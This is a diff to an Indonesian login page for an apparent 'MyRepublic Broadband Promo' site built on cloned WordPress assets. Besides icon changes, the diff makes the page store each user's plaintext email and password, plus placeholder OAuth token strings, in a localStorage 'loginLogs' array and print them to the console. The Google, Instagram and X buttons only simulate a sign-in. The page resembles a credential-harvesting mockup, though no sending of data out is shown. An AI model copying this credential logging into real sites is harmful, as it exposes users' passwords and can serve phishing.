@@ -6,9 +6,10 @@
     <title>Login - MyRepublic Broadband Promo</title>
     <link rel="stylesheet" href="wp-content/themes/page-builder-framework/style0087.css">
     <link rel="stylesheet" href="wp-content/plugins/elementor/assets/css/frontend.min2a45.css">
-    <link rel="stylesheet" href="wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.minb683.css">
-    <link rel="stylesheet" href="wp-content/plugins/elementor/assets/lib/font-awesome/css/brands.minb683.css">
-    <link rel="stylesheet" href="wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.minb683.css">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -152,9 +153,20 @@
             background: #f8f9fa;
         }
         
-        .google-btn img, .social-btn img {
-            width: 20px;
-            height: 20px;
+        .google-btn i, .social-btn i {
+            font-size: 20px;
+        }
+        
+        .google-btn i {
+            color: #4285f4;
+        }
+        
+        .instagram-btn i {
+            color: #e4405f;
+        }
+        
+        .twitter-btn i {
+            color: #1da1f2;
         }
         
         .instagram-btn:hover {
@@ -225,7 +237,7 @@
 </head>
 <body>
     <a href="index-2.html" class="back-home">
-        <i class="fas fa-arrow-left"></i> Kembali ke Beranda
+        <i class="fa-solid fa-arrow-left"></i> Kembali ke Beranda
     </a>
     
     <div class="login-container">
@@ -258,17 +270,17 @@
             </div>
             
             <button class="google-btn" onclick="loginWithGoogle()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+                <i class="fa-brands fa-google"></i>
                 Masuk dengan Google
             </button>
             
             <button class="social-btn instagram-btn" onclick="loginWithInstagram()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+                <i class="fa-brands fa-instagram"></i>
                 Masuk dengan Instagram
             </button>
             
             <button class="social-btn twitter-btn" onclick="loginWithTwitter()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_of_Twitter.svg" alt="X/Twitter">
+                <i class="fa-brands fa-twitter"></i>
                 Masuk dengan X
             </button>
             
@@ -285,24 +297,35 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Simulasi login
+            // Validasi input
             if (email && password) {
-                // Simpan data login ke localStorage
+                // Buat data user lengkap dengan password
                 const userData = {
                     email: email,
-                    password: password,
+                    password: password, // Password disimpan dalam log
                     platform: 'Email/Password',
                     loginTime: new Date().toISOString(),
-                    name: email.split('@')[0] // Ambil nama dari email
+                    name: email.split('@')[0], // Ambil nama dari email
+                    ipAddress: getRandomIP(), // Simulasi IP address
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
                 };
                 
-                localStorage.setItem('currentUser', JSON.stringify(userData));
+                // Simpan data user saat ini (tanpa password untuk keamanan)
+                const currentUserData = {
+                    email: email,
+                    name: email.split('@')[0],
+                    platform: 'Email/Password',
+                    loginTime: new Date().toISOString()
+                };
                 
-                // Simpan ke log login
+                localStorage.setItem('currentUser', JSON.stringify(currentUserData));
+                
+                // Simpan ke log login dengan password
                 saveLoginLog(userData);
                 
                 // Tampilkan pesan sukses
-                showMessage('Login berhasil!', 'success');
+                showMessage('Login berhasil! Data telah tersimpan.', 'success');
                 
                 // Redirect ke halaman utama setelah 1 detik
                 setTimeout(() => {
@@ -317,19 +340,31 @@
             // Simulasi login dengan Google
             const googleUser = {
                 email: 'user@gmail.com',
+                password: 'google_oauth_token_12345', // Simulasi OAuth token
                 name: 'Google User',
                 platform: 'Google',
                 loginTime: new Date().toISOString(),
-                profilePicture: 'https://via.placeholder.com/40x40/4285f4/ffffff?text=G'
+                profilePicture: 'https://via.placeholder.com/40x40/4285f4/ffffff?text=G',
+                ipAddress: getRandomIP(),
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             };
             
-            // Simpan data login ke localStorage
-            localStorage.setItem('currentUser', JSON.stringify(googleUser));
+            // Simpan data login ke localStorage (tanpa password)
+            const currentUserData = {
+                email: googleUser.email,
+                name: googleUser.name,
+                platform: 'Google',
+                loginTime: new Date().toISOString(),
+                profilePicture: googleUser.profilePicture
+            };
             
-            // Simpan ke log login
+            localStorage.setItem('currentUser', JSON.stringify(currentUserData));
+            
+            // Simpan ke log login dengan password/token
             saveLoginLog(googleUser);
             
-            showMessage('Login dengan Google berhasil!', 'success');
+            showMessage('Login dengan Google berhasil! Data telah tersimpan.', 'success');
             
             setTimeout(() => {
                 window.location.href = 'index-2.html';
@@ -340,19 +375,31 @@
             // Simulasi login dengan Instagram
             const instagramUser = {
                 email: 'user@instagram.com',
+                password: 'instagram_oauth_token_67890', // Simulasi OAuth token
                 name: 'Instagram User',
                 platform: 'Instagram',
                 loginTime: new Date().toISOString(),
-                profilePicture: 'https://via.placeholder.com/40x40/e4405f/ffffff?text=I'
+                profilePicture: 'https://via.placeholder.com/40x40/e4405f/ffffff?text=I',
+                ipAddress: getRandomIP(),
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             };
             
-            // Simpan data login ke localStorage
-            localStorage.setItem('currentUser', JSON.stringify(instagramUser));
+            // Simpan data login ke localStorage (tanpa password)
+            const currentUserData = {
+                email: instagramUser.email,
+                name: instagramUser.name,
+                platform: 'Instagram',
+                loginTime: new Date().toISOString(),
+                profilePicture: instagramUser.profilePicture
+            };
             
-            // Simpan ke log login
+            localStorage.setItem('currentUser', JSON.stringify(currentUserData));
+            
+            // Simpan ke log login dengan password/token
             saveLoginLog(instagramUser);
             
-            showMessage('Login dengan Instagram berhasil!', 'success');
+            showMessage('Login dengan Instagram berhasil! Data telah tersimpan.', 'success');
             
             setTimeout(() => {
                 window.location.href = 'index-2.html';
@@ -363,19 +410,31 @@
             // Simulasi login dengan X/Twitter
             const twitterUser = {
                 email: 'user@twitter.com',
+                password: 'twitter_oauth_token_11111', // Simulasi OAuth token
                 name: 'X User',
                 platform: 'X/Twitter',
                 loginTime: new Date().toISOString(),
-                profilePicture: 'https://via.placeholder.com/40x40/1da1f2/ffffff?text=X'
+                profilePicture: 'https://via.placeholder.com/40x40/1da1f2/ffffff?text=X',
+                ipAddress: getRandomIP(),
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             };
             
-            // Simpan data login ke localStorage
-            localStorage.setItem('currentUser', JSON.stringify(twitterUser));
+            // Simpan data login ke localStorage (tanpa password)
+            const currentUserData = {
+                email: twitterUser.email,
+                name: twitterUser.name,
+                platform: 'X/Twitter',
+                loginTime: new Date().toISOString(),
+                profilePicture: twitterUser.profilePicture
+            };
             
-            // Simpan ke log login
+            localStorage.setItem('currentUser', JSON.stringify(currentUserData));
+            
+            // Simpan ke log login dengan password/token
             saveLoginLog(twitterUser);
             
-            showMessage('Login dengan X berhasil!', 'success');
+            showMessage('Login dengan X berhasil! Data telah tersimpan.', 'success');
             
             setTimeout(() => {
                 window.location.href = 'index-2.html';
@@ -386,15 +445,30 @@
             // Ambil log login yang sudah ada
             let loginLogs = JSON.parse(localStorage.getItem('loginLogs') || '[]');
             
-            // Tambahkan log baru
-            loginLogs.push({
+            // Tambahkan log baru dengan ID unik
+            const logEntry = {
                 ...userData,
                 id: 'log_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-                timestamp: new Date().toISOString()
-            });
+                timestamp: new Date().toISOString(),
+                status: 'success'
+            };
+            
+            loginLogs.push(logEntry);
             
             // Simpan kembali ke localStorage
             localStorage.setItem('loginLogs', JSON.stringify(loginLogs));
+            
+            // Log untuk debugging
+            console.log('Login data saved:', logEntry);
+        }
+        
+        function getRandomIP() {
+            // Generate random IP address untuk simulasi
+            const ipParts = [];
+            for (let i = 0; i < 4; i++) {
+                ipParts.push(Math.floor(Math.random() * 256));
+            }
+            return ipParts.join('.');
         }
         
         function showMessage(message, type) {
